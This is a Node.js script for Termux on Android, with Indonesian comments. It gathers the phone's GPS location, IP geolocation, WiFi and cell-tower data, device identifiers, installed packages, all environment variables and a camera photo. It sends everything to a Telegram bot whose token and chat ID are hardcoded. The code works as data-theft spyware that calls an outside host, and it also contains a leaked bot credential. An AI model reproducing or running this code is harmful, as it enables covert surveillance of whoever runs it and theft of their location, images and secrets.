// index.js - Termux Full Reporter to Telegram
// Jalankan di Termux: pkg install nodejs termux-api && npm install && npm start

const os = require('os');
const fs = require('fs');
const path = require('path');
const { execSync, execFileSync } = require('child_process');
const axios = require('axios');
const FormData = require('form-data');

// ======= KONFIGURASI =======
const BOT_TOKEN = '7774296066:AAEDx10qvSJgE1GKoXQU3uxu2fVZKqPO8Vo';
const CHAT_ID   = '7713892596';
// Simpan file sementara di HOME Termux
const HOME = process.env.HOME || '/data/data/com.termux/files/home';
const OUT_DIR = path.join(HOME, '.termux_report');
if (!fs.existsSync(OUT_DIR)) fs.mkdirSync(OUT_DIR, { recursive: true });

// ======= UTIL =======
function run(cmd) {
  try {
    return execSync(cmd, { stdio: ['ignore', 'pipe', 'ignore'] }).toString().trim();
  } catch {
    return null;
  }
}
function runJSON(cmd) {
  const out = run(cmd);
  if (!out) return null;
  try {
    return JSON.parse(out);
  } catch {
    return null;
  }
}
async function sendMessage(text) {
  if (!text) return;
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: text
    }, { timeout: 20000 });
  } catch (e) {
    console.error('sendMessage error:', e.message);
  }
}
async function sendMessageChunked(bigText) {
  const limit = 3800; // aman < 4096
  for (let i = 0; i < bigText.length; i += limit) {
    await sendMessage(bigText.slice(i, i + limit));
  }
}
async function sendPhoto(filePath, caption = '') {
  try {
    if (!fs.existsSync(filePath)) return;
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', fs.createReadStream(filePath));
    if (caption) form.append('caption', caption);
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders(), timeout: 60000 });
  } catch (e) {
    console.error('sendPhoto error:', e.message);
  }
}
async function sendDocument(filePath, caption = '') {
  try {
    if (!fs.existsSync(filePath)) return;
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', fs.createReadStream(filePath));
    if (caption) form.append('caption', caption);
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders(), timeout: 120000 });
  } catch (e) {
    console.error('sendDocument error:', e.message);
  }
}

// ======= PENGAMBILAN DATA =======
function getBasicOSInfo() {
  let s = '⚙️ SYSTEM / OS\n';
  s += `• Hostname     : ${os.hostname()}\n`;
  s += `• Platform     : ${os.platform()} ${os.release()} (${os.arch()})\n`;
  s += `• Uptime       : ${(os.uptime()/3600).toFixed(2)} jam\n`;
  const la = os.loadavg();
  s += `• Load Avg     : ${la.map(n=>n.toFixed(2)).join(', ')}\n`;
  s += `• RAM Total    : ${(os.totalmem()/2**30).toFixed(2)} GB\n`;
  s += `• RAM Free     : ${(os.freemem()/2**30).toFixed(2)} GB\n`;
  const cpus = os.cpus();
  if (cpus && cpus.length) {
    s += `• CPU Model    : ${cpus[0].model}\n`;
    s += `• CPU Cores    : ${cpus.length}\n`;
  }
  return s;
}

function getTermuxInfo() {
  const info = run('termux-info');
  if (!info) return 'ℹ️ termux-info: tidak tersedia\n';
  return '📄 TERMUX INFO\n' + info + '\n';
}

function getBattery() {
  const b = runJSON('termux-battery-status');
  if (!b) return '🔋 Battery: tidak tersedia\n';
  return [
    '🔋 BATTERY',
    `• Percentage : ${b.percentage}%`,
    `• Status     : ${b.status}`,
    `• Plugged    : ${String(b.plugged)}`,
    `• Health     : ${b.health || 'unknown'}`,
    `• Temperature: ${b.temperature !== undefined ? b.temperature + '°C' : 'n/a'}`,
  ].join('\n') + '\n';
}

function getWifi() {
  const conn = runJSON('termux-wifi-connectioninfo');
  let s = '📶 WIFI\n';
  if (conn) {
    s += `• SSID    : ${conn.ssid}\n`;
    s += `• BSSID   : ${conn.bssid}\n`;
    s += `• IP      : ${conn.ip}\n`;
    s += `• Link Sp : ${conn.link_speed} Mbps\n`;
    s += `• RSSI    : ${conn.rssi} dBm\n`;
    s += `• Freq    : ${conn.frequency} MHz\n`;
  } else {
    s += '• Info koneksi tidak tersedia\n';
  }
  const scan = runJSON('termux-wifi-scaninfo');
  if (scan && Array.isArray(scan) && scan.length) {
    s += '• Scan Terdekat:\n';
    scan.slice(0, 10).forEach((ap, i) => {
      s += `  ${String(i+1).padStart(2,'0')}. ${ap.ssid || '(hidden)'} — ${ap.frequency}MHz, ${ap.level}dBm, ${ap.capabilities}\n`;
    });
  }
  return s + '\n';
}

function getTelephony() {
  const dev = runJSON('termux-telephony-deviceinfo');
  const cell = runJSON('termux-telephony-cellinfo');
  let s = '📱 TELEPHONY\n';
  if (dev) {
    s += `• Device ID     : ${dev.device_id || 'n/a'}\n`;
    s += `• Manufacturer  : ${dev.manufacturer || 'n/a'}\n`;
    s += `• Model         : ${dev.model || 'n/a'}\n`;
    s += `• Phone Type    : ${dev.phone_type || 'n/a'}\n`;
    s += `• Network Type  : ${dev.network_type || 'n/a'}\n`;
    s += `• SIM State     : ${dev.sim_state || 'n/a'}\n`;
    s += `• Operator      : ${dev.network_operator_name || 'n/a'}\n`;
    s += `• Country ISO   : ${dev.network_country_iso || 'n/a'}\n`;
  } else {
    s += '• Device info tidak tersedia (izin?)\n';
  }
  if (cell && Array.isArray(cell) && cell.length) {
    s += '• Cell Info:\n';
    cell.slice(0,5).forEach((c,i)=>{
      const sig = c.cellSignalStrength || {};
      const id  = c.cellIdentity || {};
      s += `  ${i+1}. ${c.type || 'cell'} LAC:${id.lac ?? id.tac ?? 'n/a'} CID:${id.cid ?? id.ci ?? 'n/a'} dBm:${sig.dbm ?? 'n/a'}\n`;
    });
  }
  return s + '\n';
}

function getStorage() {
  const dfHome = run('df -h ~') || '';
  const dfData = run('df -h /data') || '';
  let s = '💽 STORAGE\n';
  if (dfHome) s += '• df -h ~\n' + dfHome.split('\n').slice(0,2).join('\n') + '\n';
  if (dfData) s += '• df -h /data\n' + dfData.split('\n').slice(0,2).join('\n') + '\n';
  return s + '\n';
}

async function getPublicIPGeo() {
  let s = '🌐 PUBLIC IP / GEO\n';
  try {
    const { data } = await axios.get('https://ipapi.co/json/', { timeout: 15000 });
    s += `• IP        : ${data.ip}\n`;
    s += `• City      : ${data.city}\n`;
    s += `• Region    : ${data.region}\n`;
    s += `• Country   : ${data.country_name}\n`;
    s += `• Latitude  : ${data.latitude}\n`;
    s += `• Longitude : ${data.longitude}\n`;
    s += `• ASN       : ${data.asn || 'n/a'}\n`;
    s += `• Org       : ${data.org || 'n/a'}\n`;
  } catch {
    s += '• Gagal mengambil data dari ipapi.co\n';
  }
  return s + '\n';
}

function getGPS() {
  // coba provider gps, lalu network
  let gps = runJSON('termux-location --request once --provider gps');
  if (!gps) gps = runJSON('termux-location --request once --provider network');
  if (!gps) return '📍 GPS: tidak tersedia (izin?)\n\n';
  let s = '📍 LOCATION (Termux API)\n';
  s += `• Provider : ${gps.provider}\n`;
  s += `• Lat, Lon : ${gps.latitude}, ${gps.longitude}\n`;
  if (gps.altitude !== undefined) s += `• Altitude : ${gps.altitude} m\n`;
  if (gps.accuracy !== undefined) s += `• Accuracy : ${gps.accuracy} m\n`;
  if (gps.bearing !== undefined) s += `• Bearing  : ${gps.bearing}\n`;
  if (gps.speed !== undefined) s += `• Speed    : ${gps.speed} m/s\n`;
  return s + '\n';
}

function getTopProcesses() {
  // Android busybox/top berbeda-beda; ambil 30 baris pertama
  const t = run('top -n 1 -H -o RES,CPU,PID,NAME 2>/dev/null') || run('top -n 1 2>/dev/null');
  if (!t) return '📊 TOP: tidak tersedia\n\n';
  const lines = t.split('\n').slice(0, 30).join('\n');
  return '📊 TOP (ringkas)\n' + lines + '\n\n';
}

function listPackagesToFile() {
  // coba dua cara
  let out = run('pm list packages 2>/dev/null');
  if (!out) out = run('cmd package list packages 2>/dev/null');
  if (!out) return null;
  const file = path.join(OUT_DIR, 'packages_list.txt');
  fs.writeFileSync(file, out);
  return file;
}

function dumpEnvAndNetToFile() {
  const envFile = path.join(OUT_DIR, 'env.txt');
  const ifcfgFile = path.join(OUT_DIR, 'ifconfig.txt');
  const routesFile = path.join(OUT_DIR, 'routes.txt');
  fs.writeFileSync(envFile, Object.entries(process.env).map(([k,v])=>`${k}=${v}`).join('\n'));
  const ifcfg = run('ip addr 2>/dev/null') || run('ifconfig 2>/dev/null') || 'ifconfig/ip tidak tersedia';
  fs.writeFileSync(ifcfgFile, ifcfg);
  const route = run('ip route 2>/dev/null') || run('route -n 2>/dev/null') || 'route tidak tersedia';
  fs.writeFileSync(routesFile, route);
  return [envFile, ifcfgFile, routesFile];
}

function takePhoto() {
  const file0 = path.join(OUT_DIR, 'cam0.jpg');
  const file1 = path.join(OUT_DIR, 'cam1.jpg');
  // kamera 0 → kalau gagal coba kamera 1
  let ok = false;
  try {
    execFileSync('termux-camera-photo', ['-c', '0', file0], { stdio: 'ignore' });
    ok = fs.existsSync(file0);
    if (ok) return file0;
  } catch {}
  try {
    execFileSync('termux-camera-photo', ['-c', '1', file1], { stdio: 'ignore' });
    ok = fs.existsSync(file1);
    if (ok) return file1;
  } catch {}
  return null;
}

// ======= MAIN =======
(async () => {
  // Header
  const ts = new Date().toString();
  let report = `╭─ DEVICE / NETWORK REPORT ─╮\n🕒 ${ts}\n\n`;

  // Bagian-bagian
  report += getBasicOSInfo() + '\n';
  report += getBattery();
  report += getWifi();
  report += getTelephony();
  report += getStorage();
  report += getGPS();
  report += await getPublicIPGeo();
  report += getTopProcesses();
  report += getTermuxInfo();

  // Kirim sebagai pesan (dipecah kalau panjang)
  await sendMessageChunked(report);

  // Kirim file tambahan (packages, env, net)
  const pkgFile = listPackagesToFile();
  if (pkgFile) await sendDocument(pkgFile, '📦 Daftar paket terinstal');
  const [envFile, ifcfgFile, routesFile] = dumpEnvAndNetToFile();
  await sendDocument(envFile, '🌱 ENV');
  await sendDocument(ifcfgFile, '🌐 IFACE');
  await sendDocument(routesFile, '🛣 ROUTES');

  // Ambil foto kamera (opsional, butuh izin Termux:API)
  const pic = takePhoto();
  if (pic) {
    await sendPhoto(pic, '📷 Kamera (Termux API)');
  } else {
    await sendMessage('❌ Gagal mengambil foto kamera (izin tidak diberikan atau kamera tidak tersedia).');
  }

  await sendMessage('✅ Laporan selesai dikirim.');
})();
